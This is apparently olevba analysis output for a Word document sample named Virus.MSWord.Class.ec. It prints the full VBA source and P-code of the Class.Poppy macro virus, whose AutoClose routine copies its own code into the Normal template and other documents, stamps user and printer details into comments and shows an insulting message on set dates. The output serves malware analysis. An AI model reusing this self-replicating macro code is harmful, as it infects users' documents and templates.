olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Jeremy Smith6/10/1999 14:01:40HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt > 70 And ad > 0 Then GoTo out
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt < 70 Then
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End If
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
host.codemodule.AddFromFile ("c:\class.sys")
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 1 To 16
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .deletelines 1
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt < 70 Then
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 1 To 4
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline 91, "Sub ToolsMacro()"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 70 To 81
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
        .deletelines 62
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline 35, "    For x = 1 To 4"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End If
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 2 To 104 Step 2
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
out:
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
Sub ToolsMacro()
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End If
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
With host.codemodule
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    For x = 2 To 104 Step 2
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    Next x
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End With
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
out:
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End Sub
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
Sub ViewVBCode()
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ec
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12441 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:40HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #2:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #3:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #4:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #5:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #7:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #8:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #9:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #10:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #14:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #16:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #17:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #18:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #19:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #20:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #21:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #22:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #23:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #24:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #25:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #26:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #28:
' 	EndWith 
' Line #29:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #30:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #31:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #36:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #37:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #39:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #40:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #41:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #44:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #46:
' 	EndWith 
' Line #47:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #50:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #51:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #53:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #54:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #60:
' 	Label out 
' Line #61:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #62:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #63:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #64:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #65:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #66:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #67:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #68:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #69:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #70:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #71:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #72:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #73:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #74:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #75:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #76:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #77:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #78:
' 	FuncDefn (Sub ToolsMacro())
' Line #79:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #80:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #81:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #82:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #83:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #84:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #85:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #86:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #87:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #88:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #89:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #90:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #91:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #92:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #93:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #94:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #95:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #96:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #97:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #98:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #99:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #100:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #101:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #102:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #103:
' 	QuoteRem 0x0000 0x0044 "Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot"
' Line #104:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #107:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #108:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #109:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #110:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #111:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #112:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #113:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #115:
' 	EndWith 
' Line #116:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #117:
' 	Label out 
' Line #118:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #119:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #120:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #121:
' 	EndSub 
' Line #122:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #123:
' 	FuncDefn (Sub ViewVBCode())
' Line #124:
' 	QuoteRem 0x0000 0x0050 "Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT"
' Line #125:
' 	EndSub 
' Line #126:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
